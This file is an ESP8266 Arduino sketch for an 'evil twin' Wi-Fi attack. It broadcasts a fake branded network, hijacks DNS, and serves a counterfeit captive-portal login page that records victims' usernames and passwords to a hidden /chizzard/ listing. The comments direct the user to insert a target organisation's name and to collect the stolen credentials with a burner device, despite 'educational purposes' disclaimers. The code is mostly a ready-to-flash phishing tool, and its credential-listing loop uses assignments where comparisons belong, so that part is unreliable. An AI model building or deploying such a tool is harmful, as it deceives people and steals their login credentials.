//THIS CODE IS FOR EDUCATIONAL AND INSTRUCTIONAL PURPOSES ONLY
//Need custom infosec hardware/software? tasks@mentalburden.com

//ET, mental burden dot com, 2019

//Replace "BumbleStore" and/or "PrimeMesh" with your target org name
//DNS only works for 80 transcations, not 443. Visit /chizzard/ to view active creds.
//Copy creds from chizzard manually with your burner device, restart the 8266 often.
//{OPSEC is a lifestyle, not a practice}
//      /\___/\
//     /       \
//    / <|> <|> \
//    \    "    /
//     \`.___/'/
//      `-----'

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>

// --------------------------------------------------------------------------------------------CHAR ARRAYS
const char layer1[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
  <title>Captive Portal Login Page</title>
  <style>
    #content,.login,.login-card a,.login-card h1,.login-help{text-align:center}body,html{margin:0;padding:0;width:100%;height:100%;display:table}#content{font-family:'Source Sans Pro',sans-serif;background:url(captiveportal-background.jpg) center center no-repeat fixed;-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;background-size:cover;display:table-cell;vertical-align:middle}.login-card{padding:40px;width:274px;background-color:#F7F7F7;margin:0 auto 10px;border-radius:2px;box-shadow:0 2px 2px rgba(0,0,0,.3);overflow:hidden}.login-card h1{font-weight:400;font-size:2.3em;color:#1383c6}.login-card h1 span{color:#f26721}.login-card img{width:70%;height:70%}.login-card input[type=submit]{width:100%;display:block;margin-bottom:10px;position:relative}.login-card input[type=text],input[type=password]{height:44px;font-size:16px;width:100%;margin-bottom:10px;-webkit-appearance:none;background:#fff;border:1px solid #d9d9d9;border-top:1px solid silver;padding:0 8px;box-sizing:border-box;-moz-box-sizing:border-box}.login-card input[type=text]:hover,input[type=password]:hover{border:1px solid #b9b9b9;border-top:1px solid #a0a0a0;-moz-box-shadow:inset 0 1px 2px rgba(0,0,0,.1);-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,.1);box-shadow:inset 0 1px 2px rgba(0,0,0,.1)}.login{font-size:14px;font-family:Arial,sans-serif;font-weight:700;height:36px;padding:0 8px}.login-submit{-webkit-appearance:none;-moz-appearance:none;appearance:none;border:0;color:#fff;text-shadow:0 1px rgba(0,0,0,.1);background-color:#4d90fe}.login-submit:disabled{opacity:.6}.login-submit:hover{border:0;text-shadow:0 1px rgba(0,0,0,.3);background-color:#357ae8}.login-card a{text-decoration:none;color:#222;font-weight:400;display:inline-block;opacity:.6;transition:opacity ease .5s}.login-card a:hover{opacity:1}.login-help{width:100%;font-size:12px}.list{list-style-type:none;padding:0}.list__item{margin:0 0 .7rem;padding:0}label{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;text-align:left;font-size:14px;}input[type=checkbox]{-webkit-box-flex:0;-webkit-flex:none;-ms-flex:none;flex:none;margin-right:10px;float:left}@media screen and (max-width:450px){.login-card{width:70%!important}.login-card img{width:30%;height:30%}}
  </style>
</head>
<body>
<div id="content">
  <div class="login-card">    
  <h1>BumbleStore PrimeMesh</h1><br>
    <form name="login_form" method="post" action="/BumbleStoreLogin&ac111929292883838747492992028348747747/loginAuthenticator/">
    <input type="text" name="StorName" placeholder="User" id="auth_user">
    <input type="password" name="ConfWord" placeholder="Password" id="auth_pass">
      <div class="login-help">
      <ul class="list">
        <li class="list__item">
          <label class="label--checkbox">
            <input type="checkbox" class="checkbox" onchange="document.getElementById('login').disabled = !this.checked;">
            <span>I agree with the <a target="_blank" rel="noopener" href="fleppyboop.pdf">terms & licences</a></span>
          </label>
        </li>
      </ul>
      </div>
    <input name="redirurl" type="hidden" value="$PORTAL_REDIRURL$">
    <input type="submit" name="accept" class="login login-submit" value="Login" id="login" disabled>
    </form>
  </div>
</div>
</body>
</html>
)=====";
const char layer2[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
  <title>Captive Portal Login Page</title>
  <style>
    #content,.login,.login-card a,.login-card h1,.login-help{text-align:center}body,html{margin:0;padding:0;width:100%;height:100%;display:table}#content{font-family:'Source Sans Pro',sans-serif;background:url(captiveportal-background.jpg) center center no-repeat fixed;-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;background-size:cover;display:table-cell;vertical-align:middle}.login-card{padding:40px;width:274px;background-color:#F7F7F7;margin:0 auto 10px;border-radius:2px;box-shadow:0 2px 2px rgba(0,0,0,.3);overflow:hidden}.login-card h1{font-weight:400;font-size:2.3em;color:#1383c6}.login-card h1 span{color:#f26721}.login-card img{width:70%;height:70%}.login-card input[type=submit]{width:100%;display:block;margin-bottom:10px;position:relative}.login-card input[type=text],input[type=password]{height:44px;font-size:16px;width:100%;margin-bottom:10px;-webkit-appearance:none;background:#fff;border:1px solid #d9d9d9;border-top:1px solid silver;padding:0 8px;box-sizing:border-box;-moz-box-sizing:border-box}.login-card input[type=text]:hover,input[type=password]:hover{border:1px solid #b9b9b9;border-top:1px solid #a0a0a0;-moz-box-shadow:inset 0 1px 2px rgba(0,0,0,.1);-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,.1);box-shadow:inset 0 1px 2px rgba(0,0,0,.1)}.login{font-size:14px;font-family:Arial,sans-serif;font-weight:700;height:36px;padding:0 8px}.login-submit{-webkit-appearance:none;-moz-appearance:none;appearance:none;border:0;color:#fff;text-shadow:0 1px rgba(0,0,0,.1);background-color:#4d90fe}.login-submit:disabled{opacity:.6}.login-submit:hover{border:0;text-shadow:0 1px rgba(0,0,0,.3);background-color:#357ae8}.login-card a{text-decoration:none;color:#222;font-weight:400;display:inline-block;opacity:.6;transition:opacity ease .5s}.login-card a:hover{opacity:1}.login-help{width:100%;font-size:12px}.list{list-style-type:none;padding:0}.list__item{margin:0 0 .7rem;padding:0}label{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;text-align:left;font-size:14px;}input[type=checkbox]{-webkit-box-flex:0;-webkit-flex:none;-ms-flex:none;flex:none;margin-right:10px;float:left}@media screen and (max-width:450px){.login-card{width:70%!important}.login-card img{width:30%;height:30%}}
  </style>
</head>
<body>
<div id="content">
  <div class="login-card">    
  <h1>BumbleStore PrimeMesh</h1><br>
  <h3><font color="red">The username or password is incorrect</font></h3><br>  
    <form name="login_form" method="post" action="/BumbleStoreLogin&ac992887277727748747492222827863656784/loginAuthenticator/">
    <input type="text" name="StorName" placeholder="User" id="auth_user">
    <input type="password" name="ConfWord" placeholder="Password" id="auth_pass">
      <div class="login-help">
      <ul class="list">
        <li class="list__item">
          <label class="label--checkbox">
            <input type="checkbox" class="checkbox" onchange="document.getElementById('login').disabled = !this.checked;">
            <span>I agree with the <a target="_blank" rel="noopener" href="fleppyboop.pdf">terms & licences</a></span>
          </label>
        </li>
      </ul>
      </div>
    <input name="redirurl" type="hidden" value="$PORTAL_REDIRURL$">
    <input type="submit" name="accept" class="login login-submit" value="Login" id="login" disabled>
    </form>
  </div>
</div>
</body>
</html>
)=====";

//THIS CODE IS FOR EDUCATIONAL AND INSTRUCTIONAL PURPOSES ONLY
// --------------------------------------------------------------------------------------------VARS
        
        const char *ssid = "BumbleStorePrimeMesh-Internet";
        const char *password = "yourSuperCoolPasswd";

        ESP8266WebServer server(80);
        ESP8266WebServer secserver(443);
        IPAddress myIP(10,0,0,1);
        IPAddress netMsk(255, 255, 255, 0);

        const byte DNS_PORT = 53;        
        const char *myHostname = "chep";
        DNSServer dnsServer;

        const int MAXCSIZE = 10;
        String userCred[MAXCSIZE] = {"0","0","0","0","0","0","0","0","0","0"};
        String passCred[MAXCSIZE] = {"0","0","0","0","0","0","0","0","0","0"};
        int credCount = 1;


//THIS CODE IS FOR EDUCATIONAL AND INSTRUCTIONAL PURPOSES ONLY
// --------------------------------------------------------------------------------------------SETUP
void setup() 
{
  delay(10);
  Serial.begin(9600);
  Serial.println();
  Serial.print("Configuring access point...");
  WiFi.softAPConfig(myIP, myIP, netMsk);
  WiFi.softAP(ssid); //plus password if needed
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());  
  server.on("/", handleRootDir); //gives DNS * a place to route to, also direct IP connection handle
  server.on("/BumbleStoreLogin&ac111929292883838747492992028348747747/loginAuthenticator/", handleLayer1);
  server.on("/BumbleStoreLogin&ac992887277727748747492222827863656784/loginAuthenticator/", handleLayer2); 
  server.on("/chizzard/", credTailStart); //cred list page
  server.begin();
  Serial.println("HTTP server started");
  Serial.println();
  secserver.begin();
  Serial.println("HTTPS server started");
  Serial.println();

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", myIP);  
  Serial.print("dns started");
  Serial.println();
}

//THIS CODE IS FOR EDUCATIONAL AND INSTRUCTIONAL PURPOSES ONLY
// --------------------------------------------------------------------------------------------LOOP
void loop() 
{
  server.handleClient();
  //end loop
  dnsServer.processNextRequest();
}


//THIS CODE IS FOR EDUCATIONAL AND INSTRUCTIONAL PURPOSES ONLY
// --------------------------------------------------------------------------------------------BEGIN FUNCTIONS

void handleRootDir() 
{
  String page = layer1;
  server.send(200, "text/html", page);
  Serial.print("Someone visited root");
  Serial.println();
//  Serial.println("mDNS responder started");  
//  MDNS.addService("http", "tcp", 80);  
}

void handleLayer1()
{
  String page = layer2;
  String inputText1 = server.arg("StorName");
  String inputText2 = server.arg("ConfWord");
  
  userCred[credCount] = server.arg("StorName");
  passCred[credCount] = server.arg("ConfWord");
  credCount = credCount + 1;
  
  Serial.print("Inbound Creds ----");
  Serial.println();
  Serial.print("user:   ");
  Serial.print(inputText1);
  Serial.println();
  Serial.print("pass:   ");
  Serial.print(inputText2);
  Serial.println();
  server.send(200, "text/html", page);
}

void handleLayer2()
{
  String page = layer2;
  String inputText1 = server.arg("StorName");
  String inputText2 = server.arg("ConfWord");

  userCred[credCount] = server.arg("StorName");
  passCred[credCount] = server.arg("ConfWord");
  credCount = credCount + 1;

  Serial.print("on");
  Serial.println();
  Serial.print("user:   ");
  Serial.print(inputText1);
  Serial.println();
  Serial.print("pass:   ");
  Serial.print(inputText2);
  Serial.println();
  server.send(200, "text/html", page);
}


void credTailStart()
{
  String entry0;
  String entry1;
  String entry2;
  String entry3;
  String entry4;
  String entry5;
  String entry6;
  String entry7;
  String entryList;
  // Dont try to shove the cred arrays into an sprintf or concat the values, its too resource intensive. 
  //Manual string copy doesnt cause overflow. Its ugly af, but it works.
  //Tested up to 32 long creds, but it got super slow for passing 200 data, keep it around 8 for best performance.  
  for (int i = 0; i < MAXCSIZE + 1; i++)
  {
    if (i = 0)
    {
      entry0 = userCred[i] + "  -  "  + passCred[i] + "<BR>";
    }
    if (i = 1)
    {
      entry1 = userCred[i] + "  -  "  + passCred[i] + "<BR>";
    }
    if (i = 2)
    {
      entry2 = userCred[i] + "  -  "  + passCred[i] + "<BR>";
    }
    if (i = 3)
    {
      entry3 = userCred[i] + "  -  "  + passCred[i] + "<BR>";
    }
    if (i = 4)
    {
      entry4 = userCred[i] + "  -  "  + passCred[i] + "<BR>";
    }
    if (i = 5)
    {
      entry5 = userCred[i] + "  -  "  + passCred[i] + "<BR>";
    }
    if (i = 6)
    {
      entry6 = userCred[i] + "  -  "  + passCred[i] + "<BR>";
    }
    if (i = 7)
    {
      entry7 = userCred[i] + "  -  "  + passCred[i] + "<BR>";
    }
    if (i = MAXCSIZE)
    {      
      entryList = entry0 + "  " + entry1 + "  " + entry2 + "  " + entry3 + "  " + entry4+ "  " + entry5+ "  " + entry6+ "  " + entry7 + "<BR> Cred count: " + credCount + "<BR> FreeRam: " + ESP.getFreeHeap();
      handleCredTail(entryList); // passes final string to server handler     
    }
    
  }
  //clear all the strings in this func to save resources
  entry0 = "";
  entry1 = "";
  entry2 = "";
  entry3 = "";
  entry4 = "";
  entry5 = "";
  entry6 = "";
  entry7 = "";
  entryList = "";
}

void handleCredTail(String finalPage)
{
  server.send(200, "text/html", finalPage); 
}
